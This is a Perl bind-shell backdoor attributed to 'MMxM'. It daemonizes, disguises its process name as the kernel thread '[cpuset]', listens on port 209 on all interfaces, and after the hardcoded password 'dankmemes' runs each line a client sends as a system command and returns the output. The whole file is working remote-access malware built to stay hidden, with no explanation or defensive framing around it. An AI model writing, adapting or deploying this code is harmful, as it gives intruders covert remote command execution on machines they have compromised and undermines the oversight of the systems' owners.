#!/usr/bin/perl

use IO::Socket;
use strict;
use warnings;

my $pid=fork();
exit if $pid;
$0='[cpuset]';

if($#ARGV != 0){
#print '
#
#[+] Bind Shell By MMxM[*] How to use: perl bind.pl <port-to-listening>
#';
#exit;
$ARGV[0]=209;
}

my $bind = IO::Socket::INET->new(
   LocalAddr => '0.0.0.0',
   LocalPort => $ARGV[0],
   Type      => SOCK_STREAM,
        Reuse    => 1,
        Listen    => 10
) || die "[-] error : $!\n";

#print "Listen in port $ARGV[0]\n";

while(my $cmd = $bind->accept()){
   print $cmd '[*] Enter Password: ';
   chomp(my $pass = <$cmd>);
   if ($pass eq 'dankmemes'){
      print $cmd "\n[+] Welcome\n\n";
      print $cmd '$ ';
   while (my $cd = <$cmd>){
      my @code = `$cd 2> /dev/stdout`;
      my $output = join('',@code);
      print $cmd $output;
      print $cmd '$ ';
  }
}
}
close($bind);
#hi